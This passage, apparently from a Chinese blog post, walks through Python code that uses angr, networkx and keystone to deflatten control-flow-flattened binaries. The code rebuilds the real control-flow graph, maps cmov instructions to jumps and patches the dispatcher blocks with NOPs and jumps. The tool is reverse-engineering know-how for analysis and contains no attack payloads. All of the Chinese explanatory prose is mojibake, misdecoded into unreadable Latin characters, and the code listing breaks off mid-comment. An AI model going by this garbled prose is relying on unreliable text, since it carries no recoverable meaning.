class="built_in">list</span>(state.scratch.irsb.statements[state.inspect.statement].expressions)</span><br><span class="line">            <span class="keyword">if</span> expressions <span class="keyword">and</span> <span class="built_in">isinstance</span>(expressions[<span class="number">0</span>], pyvex.expr.ITE):</span><br><span class="line">                state.scratch.temps[expressions[<span class="number">0</span>].cond.tmp] = cond</span><br><span class="line">                state.inspect._breakpoints[<span class="string">&#x27;statement&#x27;</span>] = []</span><br><span class="line">        state = proj.factory.blank_state(addr=node.addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">        state.inspect.b(<span class="string">&#x27;statement&#x27;</span>, when=angr.BP_BEFORE, action=apply_branch)</span><br><span class="line">        simgr = proj.factory.simulation_manager(state)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line">            <span class="keyword">if</span> simgr.active[<span class="number">0</span>].addr <span class="keyword">in</span> targets:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> simgr.active[<span class="number">0</span>].addr</span><br><span class="line"></span><br><span class="line">new_cfg = nx.DiGraph()</span><br><span class="line">new_cfg.add_node(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>])</span><br><span class="line">relevant_addrs = [node.addr <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">1</span>:]]</span><br><span class="line">all_branches = &#123;&#125;</span><br><span class="line"><span class="comment"># Get the first real block of the function</span></span><br><span class="line">end = Get_successors(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>], relevant_addrs)</span><br><span class="line">end = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end) + <span class="number">1</span>]</span><br><span class="line">new_cfg.add_edge(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>], end)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    nodes = [node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg.nodes() <span class="keyword">if</span> new_cfg.out_degree(node) == <span class="number">0</span> <span class="keyword">and</span> node != blocks[<span class="string">&#x27;exit&#x27;</span>]]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> nodes:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">        <span class="comment"># Record each branch in relevant block. If there&#x27;s a branch, decide the operate after cmp(jz/jnz)</span></span><br><span class="line">        Get_branch(node.addr, all_branches, blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>].addr)</span><br><span class="line">        <span class="keyword">if</span> all_branches[node.addr][<span class="number">0</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            end = Get_successors(node, relevant_addrs)</span><br><span class="line">            end = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end) + <span class="number">1</span>]</span><br><span class="line">            new_cfg.add_edge(node, end)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end_true  = Get_successors(node, relevant_addrs, all_branches[node.addr][<span class="number">0</span>], claripy.BVV(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">            end_false = Get_successors(node, relevant_addrs, all_branches[node.addr][<span class="number">0</span>], claripy.BVV(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">            end_true, end_false = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end_true) + <span class="number">1</span>], blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end_false) + <span class="number">1</span>]</span><br><span class="line">            new_cfg.add_edges_from([(node, end_true), (node, end_false)])</span><br></pre></td></tr></table></figure>

<p>ç®€å•æ¥è¯´å°±æ˜¯<code>cmovxx</code>çš„æŒ‡ä»¤è½¬åŒ–ä¸ºvexcodeæ—¶å¿…å®šä¼šäº§ç”Ÿ<code>v3 = ITE(cond, v1, v2)</code>æŒ‡ä»¤ é€šè¿‡æ›´æ”¹condå°±èƒ½è¾¾åˆ°ä¸Šé¢çš„å°è¯•çš„ç›®çš„ åŒæ—¶åˆ†æçš„è¿‡ç¨‹ä¸­æ‰“å°å‡ºvex IRä¹Ÿèƒ½æ³¨æ„åˆ° å½“åŸæœ¬çš„æŒ‡ä»¤ä¸º<code>cmovx v1, v2</code>æ—¶ å¯¹åº”çš„vex IRæ€»ä¸º<code>v1 = ITE(cond, v1, v2)</code> ç›¸å å¦‚æœåŸæ¥æŒ‡ä»¤æ˜¯<code>cmovnx</code> é‚£ä¹ˆvex IRå°±ä¼šæ˜¯<code>v1 = ITE(cond, v2, v1)</code> ä¹Ÿå°±æ˜¯è¯´å½“è®¾ç½®condä¸º1æ—¶ æ‰§è¡Œçš„å°±æ˜¯ç¬¦å·ä½æ»¡è¶³æ‰§è¡ŒmovæŒ‡ä»¤çš„æ¡ä»¶ é‚£ä¹ˆå½“condä¸º1æ—¶<code>cmovxx</code>å°±å®Œç¾å¯¹åº”äº†<code>jxx</code></p>
<h3 id="patchç¨‹åº"><a href="#patchç¨‹åº" class="headerlink" title="patchç¨‹åº"></a>patchç¨‹åº</h3><p>ä¸Šé¢å·²ç»å®Œæˆäº†æ‰€æœ‰å›°éš¾çš„ä»»åŠ¡äº† æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯æ ¹æ®é‡å»ºçš„æ§åˆ¶æµå›¾æ¥patchç¨‹åº è¿™é‡Œå°†æ‰€æœ‰çš„æ— ç”¨å—éƒ½patchæˆ<code>nop</code>ä»¥æ–¹ä¾¿åç»­å¯¹æŸäº›æ— ç”¨å—çš„åˆ©ç”¨ åŒæ—¶å¯¹æœ‰åˆ†æ”¯çš„çœŸå®å—åœ¨<code>cmovxx</code>å¤„å¼€å§‹patch é‚£ä¹ˆå‰©ä½™çš„çœŸå®å—ä¹Ÿéœ€è¦patchæˆ<code>nop</code>ä»¥é˜²æŒ‡ä»¤è¯†åˆ«é”™è¯¯:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(args.path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    origin = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    base = proj.loader.main_object.min_addr</span><br><span class="line">    arch = proj.arch.name</span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">&#x27;AMD64&#x27;</span>:</span><br><span class="line">        ks = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64)</span><br><span class="line">    <span class="comment"># Fill all the irrelevant blocks with NOP</span></span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&#x27;irrelevant&#x27;</span>] + [blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]] + [blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]]:</span><br><span class="line">            origin[node.addr - base:node.addr - base + node.size] = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>] * node.size</span><br><span class="line">    <span class="comment"># Redirect the entry block to the first relevant block</span></span><br><span class="line">        node = blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]</span><br><span class="line">        first_relevant = <span class="built_in">list</span>(new_cfg.successors([node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg.nodes() <span class="keyword">if</span> new_cfg.in_degree(node) == <span class="number">0</span>][<span class="number">0</span>]))[<span class="number">0</span>]</span><br><span class="line">        new_opcode = ks.asm(<span class="string">f&#x27;jmp <span class="subst">&#123;<span class="built_in">hex</span>(first_relevant.addr)&#125;</span>&#x27;</span>, node.addr)[<span class="number">0</span>]</span><br><span class="line">        origin[node.addr - base:node.addr - base + <span class="built_in">len</span>(new_opcode)] = new_opcode</span><br><span class="line">    <span class="comment"># Rebuild the network between nodes</span></span><br><span class="line">        nodes = [node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg <span class="keyword">if</span> new_cfg.in_degree(node) <span class="keyword">and</span> new_cfg.out_degree(node)]</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">            follows = <span class="built_in">list</span>(new_cfg.successors(node))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(follows) == <span class="number">1</span>:</span><br><span class="line">                patch_addr = all_branches[node.addr][<span class="number">2</span>]</span><br><span class="line">                new_opcode = ks.asm(<span class="string">f&#x27;jmp <span class="subst">&#123;<span class="built_in">hex</span>(follows[<span class="number">0</span>].addr)&#125;</span>&#x27;</span>, patch_addr)[<span class="number">0</span>]</span><br><span class="line">                origin[patch_addr - base:patch_addr - base + <span class="built_in">len</span>(new_opcode)] = new_opcode</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                patch_addr = all_branches[node.addr][<span class="number">0</span>]</span><br><span class="line">                end_addr   = all_branches[node.addr][<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># Fill the rest of the block with NOP</span></span><br><span class="line">                origin[patch_addr - base:end_addr - base] = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>] * (end_addr - patch_addr)</span><br><span class="line">                f1, f2 = follows[<span class="number">0</span>], follows[<span class="number">1</span>]</span><br><span class="line">                op1 = x86_64_book[all_branches[node.addr][<span class="number">1</span>]] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(f1.addr)</span><br><span class="line">                new_opcode1 = ks.asm(op1, patch_addr)[<span class="number">0</span>]</span><br><span class="line">                op2 = <span class="string">&#x27;jmp &#x27;</span> + <span class="built_in">hex</span>(f2.addr)</span><br><span class="line">                new_opcode2 = ks.asm(op2, patch_addr + <span class="built_in">len</span>(new_opcode1))[<span class="number">0</span>]</span><br><span class="line">                origin[patch_addr - base:patch_addr - base + <span class="built_in">len</span>(new_opcode1 + new_opcode2)] = new_opcode1 + new_opcode2</span><br><span class="line">    <span class="comment"># Write the patched program</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_:</span><br><span class="line">        f_.write(<span class="built_in">bytes</span>(origin))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜è¦æå‡º å°†çœŸå®å—æ·»åŠ åˆ°<code>new_cfg</code>ä¸­æ—¶æ˜¯ä»¥ å…ˆåŠ å…¥cond &#x3D; 1åˆ°è¾¾çš„ä¸‹ä¸€ä¸ªçœŸå®å—ååŠ å…¥cond &#x3D; 0åˆ°è¾¾çš„ä¸‹ä¸€ä¸ªçœŸå®å—çš„é¡ºåºåŠ å…¥çš„ è¿™ä¸ªè„šæœ¬èƒ½æˆåŠŸè¿è¡ŒåŸºäºnetworkxå¯¹åŠ å…¥é¡ºåºçš„è®°å¿†æ€§ å½“ç”¨<code>.successors()</code>æ–¹æ³•å–å‡ºæ—¶ä¼šæŒ‰åŒæ ·çš„é¡ºåºå–å‡º</p>
<h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, logging, pyvex, claripy, binascii, argparse</span><br><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> ks</span><br><span class="line"><span class="keyword">from</span> angrmanagement.utils <span class="keyword">import</span> graph</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Deflat the program&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--path&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The path to input program&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--addr&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The address of the function you want to deflat, if not given, deflat main&#x27;</span>, required=<span class="literal">False</span>, default=<span class="string">&#x27;main&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The name of output program&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;--graph&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Draw the graph of the CFG after deflated, off as default&#x27;</span>, required=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--vex&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Print the vex code of the relevant block, off as default&#x27;</span>, required=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr&#x27;</span>).setLevel(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">proj = angr.Project(args.path, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">x86_64_book = &#123;<span class="string">&#x27;cmovz&#x27;</span> : <span class="string">&#x27;jz&#x27;</span>, <span class="string">&#x27;cmove&#x27;</span> : <span class="string">&#x27;jz&#x27;</span>, <span class="string">&#x27;cmovnz&#x27;</span> : <span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;cmovne&#x27;</span> : <span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;cmovg&#x27;</span> : <span class="string">&#x27;jg&#x27;</span>, <span class="string">&#x27;cmovl&#x27;</span> : <span class="string">&#x27;jl&#x27;</span>, <span class="string">&#x27;cmovge&#x27;</span> : <span class="string">&#x27;jge&#x27;</span>, <span class="string">&#x27;cmovle&#x27;</span> : <span class="string">&#x27;jle&#x27;</span>, <span class="string">&#x27;jmp&#x27;</span> : <span class="string">&#x27;jmp&#x27;</span>, <span class="string">&#x27;call&#x27;</span> : <span class="string">&#x27;call&#x27;</span>, <span class="string">&#x27;nop&#x27;</span> : <span class="string">&#x27;nop&#x27;</span>, <span class="string">&#x27;ret&#x27;</span> : [[<span class="string">&#x27;ret&#x27;</span>, <span class="string">&#x27;retn&#x27;</span>], <span class="string">&#x27;&#x27;</span>], <span class="string">&#x27;name&#x27;</span> : <span class="string">&#x27;x86_64&#x27;</span>&#125;</span><br><span class="line">arm_book = &#123;<span class="string">&#x27;moveq&#x27;</span> : <span class="string">&#x27;beq&#x27;</span>, <span class="string">&#x27;movne&#x27;</span> : <span class="string">&#x27;bne&#x27;</span>, <span class="string">&#x27;movgt&#x27;</span> : <span class="string">&#x27;bgt&#x27;</span>, <span class="string">&#x27;movlt&#x27;</span> : <span class="string">&#x27;blt&#x27;</span>, <span class="string">&#x27;movge&#x27;</span> : <span class="string">&#x27;bge&#x27;</span>, <span class="string">&#x27;movle&#x27;</span> : <span class="string">&#x27;ble&#x27;</span>, <span class="string">&#x27;jmp&#x27;</span> : <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;call&#x27;</span> : <span class="string">&#x27;bl&#x27;</span>, <span class="string">&#x27;nop&#x27;</span> : <span class="string">&#x27;nop&#x27;</span>, <span class="string">&#x27;ret&#x27;</span> : [[<span class="string">&#x27;bx&#x27;</span>], <span class="string">&#x27;lr&#x27;</span>], <span class="string">&#x27;name&#x27;</span> : <span class="string">&#x27;arm&#x27;</span>&#125;</span><br><span class="line">Ins_book = &#123;<span class="string">&#x27;AMD64&#x27;</span> : x86_64_book, <span class="string">&#x27;ARMEL&#x27;</span> : arm_book, <span class="string">&#x27;X86&#x27;</span> : x86_64_book&#125;</span><br><span class="line">KSS = &#123;<span class="string">&#x27;AMD64&#x27;</span> : ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64), <span class="string">&#x27;ARMEL&#x27;</span> : ks.Ks(ks.KS_ARCH_ARM, ks.KS_MODE_ARM), <span class="string">&#x27;X86&#x27;</span> : ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)&#125;</span><br><span class="line">book = Ins_book[proj.arch.name]</span><br><span class="line">ks = KSS[proj.arch.name]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_CFG</span>(<span class="params">proj : angr.Project</span>):</span><br><span class="line">    cfg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cfg = proj.analyses.CFGFast(normalize=<span class="literal">True</span>, force_complete_scan=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        cfg = proj.analyses.CFGFast(normalize=<span class="literal">True</span>)</span><br><span class="line">    addr = <span class="built_in">int</span>(args.addr, <span class="number">16</span>) <span class="keyword">if</span> args.addr != <span class="string">&#x27;main&#x27;</span> <span class="keyword">else</span> args.addr</span><br><span class="line">    cfg = cfg.functions[addr].transition_graph</span><br><span class="line">    IDA_cfg = graph.to_supergraph(cfg) </span><br><span class="line">    <span class="keyword">return</span> IDA_cfg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Blocks</span>(<span class="params">cfg</span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    blocks = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes():</span><br><span class="line">        <span class="keyword">if</span> cfg.in_degree(node) == <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;entry&#x27;</span>] = node</span><br><span class="line">        <span class="keyword">elif</span> cfg.out_degree(node) == <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;exit&#x27;</span>] = node</span><br><span class="line">    blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>] = <span class="built_in">list</span>(cfg.successors(blocks[<span class="string">&#x27;entry&#x27;</span>]))[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> cfg.predecessors(blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]):</span><br><span class="line">        <span class="keyword">if</span> cfg.in_degree(node) != <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>] = node</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    blocks[<span class="string">&#x27;relevant&#x27;</span>] = [blocks[<span class="string">&#x27;entry&#x27;</span>]] + [node <span class="keyword">for</span> node <span class="keyword">in</span> cfg.predecessors(blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]) <span class="keyword">if</span> cfg.in_degree(node) == <span class="number">1</span>] + [blocks[<span class="string">&#x27;exit&#x27;</span>]]</span><br><span class="line">    blocks[<span class="string">&#x27;irrelevant&#x27;</span>] = [node <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes() <span class="keyword">if</span> node <span class="keyword">not</span> <span class="keyword">in</span> blocks[<span class="string">&#x27;relevant&#x27;</span>] <span class="keyword">and</span> node != blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>] <span class="keyword">and</span> node != blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]]</span><br><span class="line">    <span class="keyword">return</span> blocks</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_branch</span>(<span class="params">block_addr, all_branches, target, _<span class="keyword">from</span>=<span class="literal">None</span>, flag=<span class="literal">False</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="comment"># This function is used to get the address where the branch is located with it&#x27;s type and the address of the end of the block</span></span><br><span class="line">    <span class="keyword">if</span> _<span class="keyword">from</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        _<span class="keyword">from</span> = block_addr</span><br><span class="line">        all_branches[_<span class="keyword">from</span>] = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">    block = proj.factory.block(block_addr)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">NOP</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    block_ins = block.capstone.insns</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> block_ins:</span><br><span class="line">        <span class="keyword">if</span> ins.mnemonic == book[<span class="string">&#x27;call&#x27;</span>]:</span><br><span class="line">            <span class="comment"># Hook all calls to avoid errors in the CFG(too deep recursion)</span></span><br><span class="line">            proj.hook(ins.address, hook=NOP, length=ins.size)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;hooked <span class="subst">&#123;<span class="built_in">hex</span>(ins.address)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> ins.mnemonic.startswith(<span class="string">&#x27;cmov&#x27;</span>) <span class="keyword">or</span> (ins.mnemonic.startswith(<span class="string">&#x27;mov&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(ins.mnemonic) &gt; <span class="number">3</span> <span class="keyword">and</span> book[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;arm&#x27;</span>):</span><br><span class="line">            all_branches[_<span class="keyword">from</span>][<span class="number">0</span>], all_branches[_<span class="keyword">from</span>][<span class="number">1</span>] = ins.address, ins.mnemonic</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> ins.mnemonic == book[<span class="string">&#x27;jmp&#x27;</span>] <span class="keyword">or</span> (ins.mnemonic <span class="keyword">in</span> book[<span class="string">&#x27;ret&#x27;</span>][<span class="number">0</span>] <span class="keyword">and</span> ins.op_str == book[<span class="string">&#x27;ret&#x27;</span>][<span class="number">1</span>]):</span><br><span class="line">        all_branches[_<span class="keyword">from</span>].append(ins.address)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Get_branch(ins.address + ins.size, all_branches, target, _<span class="keyword">from</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_successors</span>(<span class="params">node, targets : <span class="built_in">list</span>, branch_sign=<span class="literal">None</span>, cond=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> branch_sign <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        state = proj.factory.blank_state(addr=node.addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">        simgr = proj.factory.simulation_manager(state)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line">            <span class="keyword">if</span> simgr.active[<span class="number">0</span>].addr <span class="keyword">in</span> targets:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> simgr.active[<span class="number">0</span>].addr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">apply_branch</span>(<span class="params">state</span>):</span><br><span class="line">            expressions = <span class="built_in">list</span>(state.scratch.irsb.statements[state.inspect.statement].expressions)</span><br><span class="line">            <span class="keyword">if</span> expressions <span class="keyword">and</span> <span class="built_in">isinstance</span>(expressions[<span class="number">0</span>], pyvex.expr.ITE):</span><br><span class="line">                <span class="keyword">if</span> args.vex:</span><br><span class="line">                    <span class="comment"># ========Inspec of vexcode========</span></span><br><span class="line">                    block = proj.factory.block(node.addr)</span><br><span class="line">                    <span class="built_in">print</span>(block.vex.pp())</span><br><span class="line">                    <span class="comment"># ========Inspec of vexcode========</span></span><br><span class="line">                state.scratch.temps[expressions[<span class="number">0</span>].cond.tmp] = cond</span><br><span class="line">                state.inspect._breakpoints[<span class="string">&#x27;statement&#x27;</span>] = []</span><br><span class="line">        state = proj.factory.blank_state(addr=node.addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">        state.inspect.b(<span class="string">&#x27;statement&#x27;</span>, when=angr.BP_BEFORE, action=apply_branch)</span><br><span class="line">        simgr = proj.factory.simulation_manager(state)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line">            <span class="keyword">if</span> simgr.active[<span class="number">0</span>].addr <span class="keyword">in</span> targets:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> simgr.active[<span class="number">0</span>].addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># Get the cfg of a function, if passed a function address, get the cfg of that function, default is main:</span></span><br><span class="line">    cfg = Get_CFG(proj)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get each kind of block:</span></span><br><span class="line">    blocks = Get_Blocks(cfg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rebuild the cfg:</span></span><br><span class="line">    new_cfg = nx.DiGraph()</span><br><span class="line">    new_cfg.add_node(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>])</span><br><span class="line">    relevant_addrs = [node.addr <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">1</span>:]]</span><br><span class="line">    all_branches = &#123;&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Entry: <span class="subst">&#123;<span class="built_in">hex</span>(blocks[<span class="string">&quot;entry&quot;</span>].addr)&#125;</span>\nExit: <span class="subst">&#123;<span class="built_in">hex</span>(blocks[<span class="string">&quot;exit&quot;</span>].addr)&#125;</span>\nMain Dispatcher: <span class="subst">&#123;<span class="built_in">hex</span>(blocks[<span class="string">&quot;main_dispatcher&quot;</span>].addr)&#125;</span>\nPre Dispatcher: <span class="subst">&#123;<span class="built_in">hex</span>(blocks[<span class="string">&quot;pre_dispatcher&quot;</span>].addr)&#125;</span>\nRelevant: <span class="subst">&#123;[<span class="built_in">hex</span>(node.addr) <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&quot;relevant&quot;</span>]]&#125;</span>\nIrrelevant: <span class="subst">&#123;[<span class="built_in">hex</span>(node.addr) <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&quot;irrelevant&quot;</span>]]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&#x27;...&#x27;</span>)</span><br><span class="line">    <span class="comment"># Get the first real block of the function</span></span><br><span class="line">    end = Get_successors(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>], relevant_addrs)</span><br><span class="line">    end = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end) + <span class="number">1</span>]</span><br><span class="line">    new_cfg.add_edge(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>], end)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        nodes = [node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg.nodes() <span class="keyword">if</span> new_cfg.out_degree(node) == <span class="number">0</span> <span class="keyword">and</span> node != blocks[<span class="string">&#x27;exit&#x27;</span>]]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nodes:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">            <span class="comment"># Record each branch in relevant block. If there&#x27;s a branch, decide the operate after cmp(jz/jnz)</span></span><br><span class="line">            Get_branch(node.addr, all_branches, blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>].addr)</span><br><span class="line">            <span class="keyword">for</span> branch <span class="keyword">in</span> all_branches:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(branch)&#125;</span> : <span class="subst">&#123;all_branches[branch]&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> all_branches[node.addr][<span class="number">0</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                end = Get_successors(node, relevant_addrs)</span><br><span class="line">                end = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end) + <span class="number">1</span>]</span><br><span class="line">                new_cfg.add_edge(node, end)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end_true  = Get_successors(node, relevant_addrs, all_branches[node.addr][<span class="number">0</span>], claripy.BVV(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">                end_false = Get_successors(node, relevant_addrs, all_branches[node.addr][<span class="number">0</span>], claripy.BVV(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">                end_true, end_false = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end_true) + <span class="number">1</span>], blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end_false) + <span class="number">1</span>]</span><br><span class="line">                new_cfg.add_edges_from([(node, end_true), (node, end_false)])</span><br><span class="line">    <span class="keyword">if</span> args.graph:</span><br><span class="line">        <span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">        <span class="comment"># ========Draw the new cfg========</span></span><br><span class="line">        nx.draw(new_cfg, with_labels=<span class="literal">True</span>)</span><br><span class="line">        plt.show()</span><br><span class="line">        <span class="comment"># ========Draw the new cfg========</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Patch the origin 